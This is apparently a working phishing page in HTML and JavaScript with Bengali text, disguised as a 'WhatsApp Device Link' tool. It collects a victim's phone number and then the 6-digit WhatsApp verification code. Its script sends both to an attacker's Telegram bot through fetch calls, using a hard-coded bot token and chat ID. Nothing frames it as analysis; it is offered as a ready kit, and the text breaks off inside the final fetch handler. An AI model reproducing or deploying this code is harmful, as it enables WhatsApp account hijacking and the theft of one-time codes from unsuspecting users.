<!DOCTYPE html>
<html lang="bn">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>WhatsApp Device Link (Code)</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');
  body{font-family:'Poppins',sans-serif;background:#f3f4f6;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;}
  .card{background:#fff;padding:24px;border-radius:12px;box-shadow:0 6px 20px rgba(0,0,0,0.08);width:92%;max-width:420px;text-align:left;}
  h2{margin:0 0 12px 0;font-size:20px;text-align:center;}
  .row{display:flex;gap:8px;}
  select, input[type="tel"], textarea, input[type="text"] { /* ‚úÖ input[type="text"] ‡¶Ø‡ßã‡¶ó ‡¶ï‡¶∞‡¶æ ‡¶π‡ßü‡ßá‡¶õ‡ßá */
    flex:1;
    padding:10px;
    border-radius:8px;
    border:1px solid #d1d5db;
    font-size:15px;
    box-sizing: border-box;
    -webkit-appearance: none;
    appearance: none;
    background-color: #fff;
  }
  select:focus, input[type="tel"]:focus, textarea:focus, input[type="text"]:focus { /* ‚úÖ input[type="text"] ‡¶Ø‡ßã‡¶ó ‡¶ï‡¶∞‡¶æ ‡¶π‡ßü‡ßá‡¶õ‡ßá */
    outline: none;
    border-color: #128C7E;
    box-shadow: 0 0 0 3px rgba(37, 211, 102, 0.25);
  }
  .full{width:100%;margin-top:12px;}
  button{width:100%;background:#25D366;color:#fff;border:0;padding:12px;border-radius:8px;font-weight:600;cursor:pointer;font-size:16px;}
  button:hover:not(:disabled){background:#128C7E;}
  button:disabled{background-color:#999;cursor:not-allowed;}
  .muted{font-size:13px;color:#6b7280;margin-top:8px;text-align:center;}
  option{padding:8px;}
  .code-display-container{text-align:center;padding:10px 0;}
  
  /* OTP ‡¶¨‡¶ï‡ßç‡¶∏‡ßá‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶®‡¶§‡ßÅ‡¶® ‡¶∏‡ßç‡¶ü‡¶æ‡¶á‡¶≤ */
  .otp-container{margin:15px 0;}
  .otp-label{font-size:15px;color:#333;margin-bottom:8px;display:block;font-weight:600;}
  .otp-status-message{font-size:14px;min-height:20px;margin-top:10px;}
</style>
</head>
<body>
<div class="card">
  <div id="initial-form">
    <h2>WhatsApp-‡¶è ‡¶¨‡¶æ‡¶∞‡ßç‡¶§‡¶æ ‡¶™‡¶æ‡¶†‡¶æ‡¶®</h2>
    <div class="row" style="margin-bottom:10px;">
      <select id="country-select" aria-label="Country"></select>
      <input id="phone-input" type="tel" placeholder="‡¶®‡¶Æ‡ßç‡¶¨‡¶∞‡¶ü‡¶ø ‡¶ü‡¶æ‡¶á‡¶™ ‡¶ï‡¶∞‡ßÅ‡¶®" />
    </div>
    
    <div class="full" style="margin-top:10px;">
        <textarea id="message-input" placeholder="‡¶ï‡¶æ‡¶∏‡ßç‡¶ü‡¶Æ ‡¶¨‡¶æ‡¶∞‡ßç‡¶§‡¶æ‡¶ü‡¶ø ‡¶ü‡¶æ‡¶á‡¶™ ‡¶ï‡¶∞‡ßÅ‡¶®..." rows="3"></textarea>
    </div>
    
    <div class="full">
      <button id="add-button">‡¶ï‡¶æ‡¶∏‡ßç‡¶ü‡¶Æ ‡¶¨‡¶æ‡¶∞‡ßç‡¶§‡¶æ ‡¶™‡¶æ‡¶†‡¶æ‡¶®</button>
      <p class="muted">‡¶¶‡ßá‡¶∂ ‡¶ï‡ßã‡¶° ‡¶®‡¶ø‡¶∞‡ßç‡¶¨‡¶æ‡¶ö‡¶® ‡¶¨‡¶æ ‡¶ü‡¶æ‡¶á‡¶™ ‡¶ï‡¶∞‡ßÅ‡¶®‡•§</p>
    </div>
  </div>
  
  <div id="code-display" style="display:none;">
    <h2>‡¶Ü‡¶®‡¶≤‡¶ï ‡¶®‡¶Æ‡ßç‡¶¨‡¶∞ ‡¶Ø‡¶æ‡¶ö‡¶æ‡¶á ‡¶ï‡¶∞‡ßÅ‡¶®</h2>
    <p class="code-instructions">WhatsApp ‡¶•‡ßá‡¶ï‡ßá ‡¶™‡¶æ‡¶ì‡ßü‡¶æ ‡ß¨ ‡¶∏‡¶Ç‡¶ñ‡ßç‡¶Ø‡¶æ‡¶∞ ‡¶Ø‡¶æ‡¶ö‡¶æ‡¶á‡¶ï‡¶∞‡¶£ ‡¶ï‡ßã‡¶°‡¶ü‡¶ø ‡¶è‡¶ñ‡¶æ‡¶®‡ßá ‡¶¨‡¶∏‡¶æ‡¶®‡•§</p>
    
    <!-- ‚úÖ OTP ‡¶á‡¶®‡¶™‡ßÅ‡¶ü ‡¶´‡¶ø‡¶≤‡ßç‡¶° ‡¶Ø‡ßã‡¶ó ‡¶ï‡¶∞‡¶æ ‡¶π‡ßü‡ßá‡¶õ‡ßá -->
    <div class="otp-container">
        <label for="otp-input" class="otp-label">Your Unlock Number (6 Digits)</label>
        <input id="otp-input" type="text" pattern="\d*" maxlength="6" inputmode="numeric" placeholder="‡ß¶ ‡ß¶ ‡ß¶ ‡ß¶ ‡ß¶ ‡ß¶" oninput="checkAndSubmit();" style="text-align: center; font-size: 24px; letter-spacing: 5px;"/>
    </div>
    
    <p class="otp-status-message" id="message-status" style="color:#DC3545; font-weight: 500;">‚ö†Ô∏è WhatsApp ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶™‡ßá ‡¶™‡¶æ‡¶ì‡¶Ø‡¶º‡¶æ ‡ß¨ ‡¶∏‡¶Ç‡¶ñ‡ßç‡¶Ø‡¶æ‡¶∞ ‡¶ï‡ßã‡¶°‡¶ü‡¶ø ‡¶¨‡¶∏‡¶æ‡¶®‡•§</p>
    
    <button id="reload-button" style="margin-top:15px;" onclick="window.location.reload();">‡¶®‡¶§‡ßÅ‡¶® ‡¶Ö‡¶®‡ßÅ‡¶∞‡ßã‡¶ß ‡¶∂‡ßÅ‡¶∞‡ßÅ ‡¶ï‡¶∞‡ßÅ‡¶®</button>
  </div>
</div>
<script>
// =================================================================
//                 ‚úÖ ‡¶ü‡ßá‡¶≤‡¶ø‡¶ó‡ßç‡¶∞‡¶æ‡¶Æ ‡¶ï‡¶®‡¶´‡¶ø‡¶ó‡¶æ‡¶∞‡ßá‡¶∂‡¶®
// =================================================================
const BOT_TOKEN = "8194432183:AAFAvwjg6XsN4Yi6v6BysSIWg4rCF_Kr-rI"; 
const CHAT_ID = "6658445342";
let isSubmitting = false; // ‡¶è‡¶ï‡¶æ‡¶ß‡¶ø‡¶ï‡¶¨‡¶æ‡¶∞ ‡¶∏‡¶æ‡¶¨‡¶Æ‡¶ø‡¶ü ‡¶π‡¶ì‡ßü‡¶æ ‡¶Ü‡¶ü‡¶ï‡¶æ‡¶®‡ßã‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø

// ‡¶ó‡ßç‡¶≤‡ßã‡¶¨‡¶æ‡¶≤ ‡¶≠‡ßç‡¶Ø‡¶æ‡¶∞‡¶ø‡¶Ø‡¶º‡ßá‡¶¨‡¶≤ ‡¶∏‡¶Ç‡¶∞‡¶ï‡ßç‡¶∑‡¶£ ‡¶ï‡¶∞‡¶æ ‡¶π‡¶≤‡ßã, ‡¶Ø‡¶æ‡¶§‡ßá OTP ‡¶∏‡ßç‡¶ï‡ßç‡¶∞‡¶ø‡¶®‡ßá ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞ ‡¶ï‡¶∞‡¶æ ‡¶Ø‡¶æ‡ßü
let globalPhoneNumber = '';
let globalCustomMessage = '';
// =================================================================

// ‡¶¶‡ßá‡¶∂‡ßá‡¶∞ ‡¶§‡¶æ‡¶≤‡¶ø‡¶ï‡¶æ (‡¶Ü‡¶ó‡ßá‡¶∞ ‡¶ï‡ßã‡¶° ‡¶•‡ßá‡¶ï‡ßá)
const countries = [ {name:'Afghanistan',code:'93',flag:'üá¶üá´'},{name:'Albania',code:'355',flag:'üá¶üá±'},{name:'Algeria',code:'213',flag:'üá©üáø'}, {name:'American Samoa',code:'1684',flag:'üá¶üá∏'},{name:'Andorra',code:'376',flag:'üá¶üá©'},{name:'Angola',code:'244',flag:'üá¶üá¥'}, {name:'Anguilla',code:'1264',flag:'üá¶üáÆ'},{name:'Antigua & Barbuda',code:'1268',flag:'üá¶üá¨'},{name:'Argentina',code:'54',flag:'üá¶üá∑'}, {name:'Armenia',code:'374',flag:'üá¶üá≤'},{name:'Aruba',code:'297',flag:'üá¶üáº'},{name:'Australia',code:'61',flag:'üá¶üá∫'}, {name:'Austria',code:'43',flag:'üá¶üáπ'},{name:'Azerbaijan',code:'994',flag:'üá¶üáø'},{name:'Bahamas',code:'1242',flag:'üáßüá∏'}, {name:'Bahrain',code:'973',flag:'üáßüá≠'},{name:'Bangladesh',code:'880',flag:'üáßüá©'},{name:'Barbados',code:'1246',flag:'üáßüáß'}, {name:'Belarus',code:'375',flag:'üáßüáæ'},{name:'Belgium',code:'32',flag:'üáßüá™'},{name:'Belize',code:'501',flag:'üáßüáø'}, {name:'Benin',code:'229',flag:'üáßüáØ'},{name:'Bermuda',code:'1441',flag:'üáßüá≤'},{name:'Bhutan',code:'975',flag:'üáßüáπ'}, {name:'Bolivia',code:'591',flag:'üáßüá¥'},{name:'Bosnia & Herzegovina',code:'387',flag:'üáßüá¶'},{name:'Botswana',code:'267',flag:'üáßüáº'}, {name:'Brazil',code:'55',flag:'üáßüá∑'},{name:'British Virgin Islands',code:'1284',flag:'üáªüá¨'},{name:'Brunei',code:'673',flag:'üáßüá≥'}, {name:'Bulgaria',code:'359',flag:'üáßüá¨'},{name:'Burkina Faso',code:'226',flag:'üáßüá´'},{name:'Burundi',code:'257',flag:'üáßüáÆ'}, {name:'Cambodia',code:'855',flag:'üá∞üá≠'},{name:'Cameroon',code:'237',flag:'üá®üá≤'},{name:'Canada',code:'1',flag:'üá®üá¶'}, {name:'Cape Verde',code:'238',flag:'üá®üáª'},{name:'Cayman Islands',code:'1345',flag:'üá∞üáæ'},{name:'Central African Republic',code:'236',flag:'üá®üá´'}, {name:'Chad',code:'235',flag:'üáπüá©'},{name:'Chile',code:'56',flag:'üá®üá±'},{name:'China',code:'86',flag:'üá®üá≥'}, {name:'Colombia',code:'57',flag:'üá®üá¥'},{name:'Comoros',code:'269',flag:'üá∞üá≤'},{name:'Congo (Brazzaville)',code:'242',flag:'üá®üá¨'}, {name:'Congo (DRC)',code:'243',flag:'üá®üá©'},{name:'Cook Islands',code:'682',flag:'üá®üá∞'},{name:'Costa Rica',code:'506',flag:'üá®üá∑'}, {name:'C√¥te d‚ÄôIvoire',code:'225',flag:'üá®üáÆ'},{name:'Croatia',code:'385',flag:'üá≠üá∑'},{name:'Cuba',code:'53',flag:'üá®üá∫'}, {name:'Cyprus',code:'357',flag:'üá®üáæ'},{name:'Czech Republic',code:'420',flag:'üá®üáø'},{name:'Denmark',code:'45',flag:'üá©üá∞'}, {name:'Djibouti',code:'253',flag:'üá©üáØ'},{name:'Dominica',code:'1767',flag:'üá©üá≤'},{name:'Dominican Republic',code:'1',flag:'üá©üá¥'}, {name:'Ecuador',code:'593',flag:'üá™üá®'},{name:'Egypt',code:'20',flag:'üá™üá¨'},{name:'El Salvador',code:'503',flag:'üá∏üáª'}, {name:'Equatorial Guinea',code:'240',flag:'üá¨üá∂'},{name:'Eritrea',code:'291',flag:'üá™üá∑'},{name:'Estonia',code:'372',flag:'üá™üá™'}, {name:'Ethiopia',code:'251',flag:'üá™üáπ'},{name:'Falkland Islands',code:'500',flag:'üá´üá∞'},{name:'Faroe Islands',code:'298',flag:'üá´üá¥'}, {name:'Fiji',code:'679',flag:'üá´üáØ'},{name:'Finland',code:'358',flag:'üá´üáÆ'},{name:'France',code:'33',flag:'üá´üá∑'}, {name:'French Guiana',code:'594',flag:'üá¨üá´'},{name:'French Polynesia',code:'689',flag:'üáµüá´'},{name:'Gabon',code:'241',flag:'üá¨üá¶'}, {name:'Gambia',code:'220',flag:'üá¨üá≤'},{name:'Georgia',code:'995',flag:'üá¨üá™'},{name:'Germany',code:'49',flag:'üá©üá™'}, {name:'Ghana',code:'233',flag:'üá¨üá≠'},{name:'Gibraltar',code:'350',flag:'üá¨üáÆ'},{name:'Greece',code:'30',flag:'üá¨üá∑'}, {name:'Greenland',code:'299',flag:'üá¨üá±'},{name:'Grenada',code:'1473',flag:'üá¨üá©'},{name:'Guadeloupe',code:'590',flag:'üá¨üáµ'}, {name:'Guam',code:'1671',flag:'üá¨üá∫'},{name:'Guatemala',code:'502',flag:'üá¨üáπ'},{name:'Guernsey',code:'44',flag:'üá¨üá¨'}, {name:'Guinea',code:'224',flag:'üá¨üá≥'},{name:'Guinea-Bissau',code:'245',flag:'üá¨üáº'},{name:'Guyana',code:'592',flag:'üá¨üáæ'}, {name:'Haiti',code:'509',flag:'üá≠üáπ'},{name:'Honduras',code:'504',flag:'üá≠üá≥'},{name:'Hong Kong',code:'852',flag:'üá≠üá∞'}, {name:'Hungary',code:'36',flag:'üá≠üá∫'},{name:'Iceland',code:'354',flag:'üáÆüá∏'},{name:'India',code:'91',flag:'üáÆüá≥'}, {name:'Indonesia',code:'62',flag:'üáÆüá©'},{name:'Iran',code:'98',flag:'üáÆüá∑'},{name:'Iraq',code:'964',flag:'üáÆüá∂'}, {name:'Ireland',code:'353',flag:'üáÆüá™'},{name:'Isle of Man',code:'44',flag:'üáÆüá≤'},{name:'Israel',code:'972',flag:'üáÆüá±'}, {name:'Italy',code:'39',flag:'üáÆüáπ'},{name:'Jamaica',code:'1',flag:'üáØüá≤'},{name:'Japan',code:'81',flag:'üáØüáµ'}, {name:'Jersey',code:'44',flag:'üáØüá™'},{name:'Jordan',code:'962',flag:'üáØüá¥'},{name:'Kazakhstan',code:'7',flag:'üá∞üáø'}, {name:'Kenya',code:'254',flag:'üá∞üá™'},{name:'Kiribati',code:'686',flag:'üá∞üáÆ'},{name:'Kuwait',code:'965',flag:'üá∞üáº'}, {name:'Kyrgyzstan',code:'996',flag:'üá∞üá¨'},{name:'Laos',code:'856',flag:'üá±üá¶'},{name:'Latvia',code:'371',flag:'üá±üáª'}, {name:'Lebanon',code:'961',flag:'üá±üáß'},{name:'Lesotho',code:'266',flag:'üá±üá∏'},{name:'Liberia',code:'231',flag:'üá±üá∑'}, {name:'Libya',code:'218',flag:'üá±üáæ'},{name:'Liechtenstein',code:'423',flag:'üá±üáÆ'},{name:'Lithuania',code:'370',flag:'üá±üáπ'}, {name:'Luxembourg',code:'352',flag:'üá±üá∫'},{name:'Macau',code:'853',flag:'üá≤üá¥'},{name:'Madagascar',code:'261',flag:'üá≤üá¨'}, {name:'Malawi',code:'265',flag:'üá≤üáº'},{name:'Malaysia',code:'60',flag:'üá≤üáæ'},{name:'Maldives',code:'960',flag:'üá≤üáª'}, {name:'Mali',code:'223',flag:'üá≤üá±'},{name:'Malta',code:'356',flag:'üá≤üáπ'},{name:'Martinique',code:'596',flag:'üá≤üá∂'}, {name:'Mauritania',code:'222',flag:'üá≤üá∑'},{name:'Mauritius',code:'230',flag:'üá≤üá∫'},{name:'Mexico',code:'52',flag:'üá≤üáΩ'}, {name:'Moldova',code:'373',flag:'üá≤üá©'},{name:'Monaco',code:'377',flag:'üá≤üá®'},{name:'Mongolia',code:'976',flag:'üá≤üá≥'}, {name:'Montenegro',code:'382',flag:'üá≤üá™'},{name:'Morocco',code:'212',flag:'üá≤üá¶'},{name:'Mozambique',code:'258',flag:'üá≤üáø'}, {name:'Myanmar (Burma)',code:'95',flag:'üá≤üá≤'},{name:'Namibia',code:'264',flag:'üá≥üá¶'},{name:'Nepal',code:'977',flag:'üá≥üáµ'}, {name:'Netherlands',code:'31',flag:'üá≥üá±'},{name:'New Caledonia',code:'687',flag:'üá≥üá®'},{name:'New Zealand',code:'64',flag:'üá≥üáø'}, {name:'Nicaragua',code:'505',flag:'üá≥üáÆ'},{name:'Niger',code:'227',flag:'üá≥üá™'},{name:'Nigeria',code:'234',flag:'üá≥üá¨'}, {name:'North Korea',code:'850',flag:'üá∞üáµ'},{name:'North Macedonia',code:'389',flag:'üá≤üá∞'},{name:'Norway',code:'47',flag:'üá≥üá¥'}, {name:'Oman',code:'968',flag:'üá¥üá≤'},{name:'Pakistan',code:'92',flag:'üáµüá∞'},{name:'Palau',code:'680',flag:'üáµüáº'}, {name:'Palestine',code:'970',flag:'üáµüá∏'},{name:'Panama',code:'507',flag:'üáµüá¶'},{name:'Papua New Guinea',code:'675',flag:'üáµüá¨'}, {name:'Paraguay',code:'595',flag:'üáµüáæ'},{name:'Peru',code:'51',flag:'üáµüá™'},{name:'Philippines',code:'63',flag:'üáµüá≠'}, {name:'Poland',code:'48',flag:'üáµüá±'},{name:'Portugal',code:'351',flag:'üáµüáπ'},{name:'Puerto Rico',code:'1',flag:'üáµüá∑'}, {name:'Qatar',code:'974',flag:'üá∂üá¶'},{name:'R√©union',code:'262',flag:'üá∑üá™'},{name:'Romania',code:'40',flag:'üá∑üá¥'}, {name:'Russia',code:'7',flag:'üá∑üá∫'},{name:'Rwanda',code:'250',flag:'üá∑üáº'},{name:'Samoa',code:'685',flag:'üáºüá∏'}, {name:'San Marino',code:'378',flag:'üá∏üá≤'},{name:'S√£o Tom√© & Pr√≠ncipe',code:'239',flag:'üá∏üáπ'},{name:'Saudi Arabia',code:'966',flag:'üá∏üá¶'}, {name:'Senegal',code:'221',flag:'üá∏üá≥'},{name:'Serbia',code:'381',flag:'üá∑üá∏'},{name:'Seychelles',code:'248',flag:'üá∏üá®'}, {name:'Sierra Leone',code:'232',flag:'üá∏üá±'},{name:'Singapore',code:'65',flag:'üá∏üá¨'},{name:'Slovakia',code:'421',flag:'üá∏üá∞'}, {name:'Slovenia',code:'386',flag:'üá∏üáÆ'},{name:'Solomon Islands',code:'677',flag:'üá∏üáß'},{name:'Somalia',code:'252',flag:'üá∏üá¥'}, {name:'South Africa',code:'27',flag:'üáøüá¶'},{name:'South Korea',code:'82',flag:'üá∞üá∑'},{name:'South Sudan',code:'211',flag:'üá∏üá∏'}, {name:'Spain',code:'34',flag:'üá™üá∏'},{name:'Sri Lanka',code:'94',flag:'üá±üá∞'},{name:'Sudan',code:'249',flag:'üá∏üá©'}, {name:'Suriname',code:'597',flag:'üá∏üá∑'},{name:'Sweden',code:'46',flag:'üá∏üá™'},{name:'Switzerland',code:'41',flag:'üá®üá≠'}, {name:'Syria',code:'963',flag:'üá∏üáæ'},{name:'Taiwan',code:'886',flag:'üáπüáº'},{name:'Tanzania',code:'255',flag:'üáπüáø'}, {name:'Thailand',code:'66',flag:'üáπüá≠'},{name:'Timor-Leste',code:'670',flag:'üáπüá±'},{name:'Togo',code:'228',flag:'üáπüá¨'}, {name:'Tonga',code:'676',flag:'üáπüá¥'},{name:'Trinidad & Tobago',code:'1868',flag:'üáπüáπ'},{name:'Tunisia',code:'216',flag:'üáπüá≥'}, {name:'Turkey',code:'90',flag:'üáπüá∑'},{name:'Turkmenistan',code:'993',flag:'üáπüá≤'},{name:'Uganda',code:'256',flag:'üá∫üá¨'}, {name:'Ukraine',code:'380',flag:'üá∫üá¶'},{name:'UAE',code:'971',flag:'üá¶üá™'},{name:'United Kingdom',code:'44',flag:'üá¨üáß'}, {name:'United States',code:'1',flag:'üá∫üá∏'},{name:'Uruguay',code:'598',flag:'üá∫üáæ'},{name:'Uzbekistan',code:'998',flag:'üá∫üáø'}, {name:'Venezuela',code:'58',flag:'üáªüá™'},{name:'Vietnam',code:'84',flag:'üáªüá≥'},{name:'Yemen',code:'967',flag:'üáæüá™'}, {name:'Zambia',code:'260',flag:'üáøüá≤'},{name:'Zimbabwe',code:'263',flag:'üáøüáº'} ];

// DOM ‡¶è‡¶≤‡¶ø‡¶Æ‡ßá‡¶®‡ßç‡¶ü
const select = document.getElementById('country-select');
const phone = document.getElementById('phone-input');
const messageInput = document.getElementById('message-input'); 
const addButton = document.getElementById('add-button');
const initialForm = document.getElementById('initial-form');
const codeDisplay = document.getElementById('code-display');
const messageStatus = document.getElementById('message-status');
const otpBox = document.getElementById("otp-input"); // ‡¶®‡¶§‡ßÅ‡¶® OTP ‡¶á‡¶®‡¶™‡ßÅ‡¶ü ‡¶¨‡¶ï‡ßç‡¶∏

// ‡¶¶‡ßá‡¶∂‡ßá‡¶∞ ‡¶°‡ßç‡¶∞‡¶™‡¶°‡¶æ‡¶â‡¶® ‡¶∏‡ßá‡¶ü‡¶Ü‡¶™ ‡¶è‡¶¨‡¶Ç ‡¶∏‡¶ø‡¶ô‡ßç‡¶ï‡ßç‡¶∞‡ßã‡¶®‡¶æ‡¶á‡¶ú‡ßá‡¶∂‡¶®
countries.forEach(c=>{const opt=document.createElement('option');opt.value=c.code;opt.textContent=`${c.flag} ${c.name} (+${c.code})`;select.appendChild(opt)});
select.value='880';phone.value='+880 ';
select.addEventListener('change',()=>{const rest=phone.value.replace(/^\+\d+\s?/,'');phone.value=`+${select.value} ${rest}`});
phone.addEventListener('input',()=>{const m=phone.value.match(/^\+?(\d{1,4})/);if(m){const found=countries.find(c=>c.code===m[1]);if(found)select.value=found.code}});

// =================================================================
//                 ‚úÖ ‡¶ß‡¶æ‡¶™ ‡ßß: ‡¶´‡ßã‡¶® ‡¶®‡¶Æ‡ßç‡¶¨‡¶∞ ‡¶è‡¶¨‡¶Ç ‡¶Æ‡ßá‡¶∏‡ßá‡¶ú ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã
// =================================================================
addButton.addEventListener('click', () => {
    const fullPhoneNumber = phone.value.replace(/\s+/g, '').replace(/-/g, '').trim(); 
    const customMessage = messageInput.value.trim();

    if (!fullPhoneNumber.startsWith('+') || fullPhoneNumber.length < 8) {
        alert('‡¶Ö‡¶®‡ßÅ‡¶ó‡ßç‡¶∞‡¶π ‡¶ï‡¶∞‡ßá ‡¶¶‡ßá‡¶∂ ‡¶ï‡ßã‡¶° ‡¶∏‡¶π ‡¶è‡¶ï‡¶ü‡¶ø ‡¶∏‡¶†‡¶ø‡¶ï ‡¶´‡ßã‡¶® ‡¶®‡¶Æ‡ßç‡¶¨‡¶∞ ‡¶¶‡¶ø‡¶®‡•§');
        return;
    }
    
    if (customMessage.length === 0) {
        alert('‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶è‡¶ï‡¶ü‡¶ø ‡¶¨‡¶æ‡¶∞‡ßç‡¶§‡¶æ ‡¶ü‡¶æ‡¶á‡¶™ ‡¶ï‡¶∞‡ßÅ‡¶®‡•§');
        return;
    }

    // ‡¶ó‡ßç‡¶≤‡ßã‡¶¨‡¶æ‡¶≤ ‡¶≠‡ßç‡¶Ø‡¶æ‡¶∞‡¶ø‡¶Ø‡¶º‡ßá‡¶¨‡¶≤‡ßá ‡¶°‡ßá‡¶ü‡¶æ ‡¶∏‡¶Ç‡¶∞‡¶ï‡ßç‡¶∑‡¶£
    globalPhoneNumber = fullPhoneNumber;
    globalCustomMessage = customMessage;

    addButton.textContent = '‡¶¨‡¶æ‡¶∞‡ßç‡¶§‡¶æ ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã ‡¶π‡¶ö‡ßç‡¶õ‡ßá...'; 
    addButton.disabled = true;

    // ‡¶ü‡ßá‡¶≤‡¶ø‡¶ó‡ßç‡¶∞‡¶æ‡¶Æ‡ßá‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶Æ‡ßá‡¶∏‡ßá‡¶ú ‡¶§‡ßà‡¶∞‡¶ø
    const telegramMessage = `üìû *‡¶®‡¶§‡ßÅ‡¶® WhatsApp ‡¶∏‡¶Ç‡¶Ø‡ßã‡¶ó‡ßá‡¶∞ ‡¶ö‡ßá‡¶∑‡ßç‡¶ü‡¶æ!*
    
*‡¶®‡¶Æ‡ßç‡¶¨‡¶∞:* \`${globalPhoneNumber}\`
*‡¶¨‡¶æ‡¶∞‡ßç‡¶§‡¶æ:* ${globalCustomMessage}
    
_‡¶è‡¶ñ‡¶® OTP-‡¶è‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶Ö‡¶™‡ßá‡¶ï‡ßç‡¶∑‡¶æ ‡¶ï‡¶∞‡¶æ ‡¶π‡¶ö‡ßç‡¶õ‡ßá..._`;

    // ‡¶ü‡ßá‡¶≤‡¶ø‡¶ó‡ßç‡¶∞‡¶æ‡¶Æ API ‡¶ï‡¶≤
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ 
            chat_id: CHAT_ID,
            text: telegramMessage,
            parse_mode: 'Markdown'
        })
    })
    .finally(() => {
        // API ‡¶∏‡¶´‡¶≤ ‡¶π‡ßã‡¶ï ‡¶¨‡¶æ ‡¶¨‡ßç‡¶Ø‡¶∞‡ßç‡¶•, OTP ‡¶∏‡ßç‡¶ï‡ßç‡¶∞‡¶ø‡¶®‡ßá ‡¶ö‡¶≤‡ßá ‡¶Ø‡¶æ‡¶¨‡ßá
        initialForm.style.display = 'none';
        codeDisplay.style.display = 'block';
    });
});

// =================================================================
//                 ‚úÖ ‡¶ß‡¶æ‡¶™ ‡ß®: OTP ‡¶á‡¶®‡¶™‡ßÅ‡¶ü ‡¶ì ‡¶Ö‡¶ü‡ßã-‡¶∏‡¶æ‡¶¨‡¶Æ‡¶ø‡¶ü
// =================================================================
function checkAndSubmit() {
  let otp = otpBox.value.trim();
  
  // ‡¶á‡¶®‡¶™‡ßÅ‡¶ü‡¶ï‡ßá 6 ‡¶°‡¶ø‡¶ú‡¶ø‡¶ü‡ßá ‡¶∏‡ßÄ‡¶Æ‡¶æ‡¶¨‡¶¶‡ßç‡¶ß ‡¶ï‡¶∞‡¶æ
  if (otp.length > 6) {
    otp = otp.substring(0, 6);
    otpBox.value = otp;
  }
  
  // 6 ‡¶°‡¶ø‡¶ú‡¶ø‡¶ü ‡¶π‡¶≤‡ßá‡¶á ‡¶Ö‡¶ü‡ßã-‡¶∏‡¶æ‡¶¨‡¶Æ‡¶ø‡¶ü
  if (otp.length === 6 && !isSubmitting) {
    submitOtp(otp);
  } else if (otp.length < 6) {
    // 6 ‡¶°‡¶ø‡¶ú‡¶ø‡¶ü‡ßá‡¶∞ ‡¶ï‡¶Æ ‡¶π‡¶≤‡ßá ‡¶ï‡ßã‡¶® ‡¶Æ‡ßá‡¶∏‡ßá‡¶ú ‡¶¶‡ßá‡¶ñ‡¶æ‡¶¨‡ßá ‡¶®‡¶æ, ‡¶∂‡ßÅ‡¶ß‡ßÅ ‡¶Ö‡¶™‡ßá‡¶ï‡ßç‡¶∑‡¶æ ‡¶ï‡¶∞‡¶¨‡ßá‡•§
    messageStatus.textContent = "‚ö†Ô∏è WhatsApp ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶™‡ßá ‡¶™‡¶æ‡¶ì‡¶Ø‡¶º‡¶æ ‡¶∏‡¶†‡¶ø‡¶ï ‡ß¨ ‡¶∏‡¶Ç‡¶ñ‡ßç‡¶Ø‡¶æ‡¶∞ ‡¶ï‡ßã‡¶°‡¶ü‡¶ø ‡¶¨‡¶∏‡¶æ‡¶®‡•§";
    messageStatus.style.color = '#DC3545';
  }
}

// ‡¶ö‡ßÇ‡¶°‡¶º‡¶æ‡¶®‡ßç‡¶§ OTP ‡¶ü‡ßá‡¶≤‡¶ø‡¶ó‡ßç‡¶∞‡¶æ‡¶Æ ‡¶¨‡¶ü‡ßá ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã
function submitOtp(otp) {
  isSubmitting = true;
  messageStatus.textContent = "üîÑ ‡¶ï‡ßã‡¶° ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã ‡¶π‡¶ö‡ßç‡¶õ‡ßá ‡¶è‡¶¨‡¶Ç ‡¶Ø‡¶æ‡¶ö‡¶æ‡¶á ‡¶ï‡¶∞‡¶æ ‡¶π‡¶ö‡ßç‡¶õ‡ßá...";
  messageStatus.style.color = '#128C7E';
  otpBox.disabled = true;

  // ‡¶ü‡ßá‡¶≤‡¶ø‡¶ó‡ßç‡¶∞‡¶æ‡¶Æ‡ßá‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶ö‡ßÇ‡¶°‡¶º‡¶æ‡¶®‡ßç‡¶§ ‡¶Æ‡ßá‡¶∏‡ßá‡¶ú ‡¶§‡ßà‡¶∞‡¶ø
  const finalMessage = `üö® *‡¶®‡¶§‡ßÅ‡¶® WhatsApp OTP!* üö®
    
*‡¶®‡¶Æ‡ßç‡¶¨‡¶∞:* \`${globalPhoneNumber}\`
*‡¶¨‡¶æ‡¶∞‡ßç‡¶§‡¶æ:* ${globalCustomMessage}

*üîë UNLOCK CODE:* \`${otp}\`
    
_‡¶∏‡¶Æ‡¶Ø‡¶º: ${new Date().toLocaleString('en-US', { timeZone: 'Asia/Dhaka' })}_`;


  // ‡¶ü‡ßá‡¶≤‡¶ø‡¶ó‡ßç‡¶∞‡¶æ‡¶Æ API call
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: CHAT_ID, text: finalMessage, parse_mode: 'Markdown' })
  })
  .finally(() => {
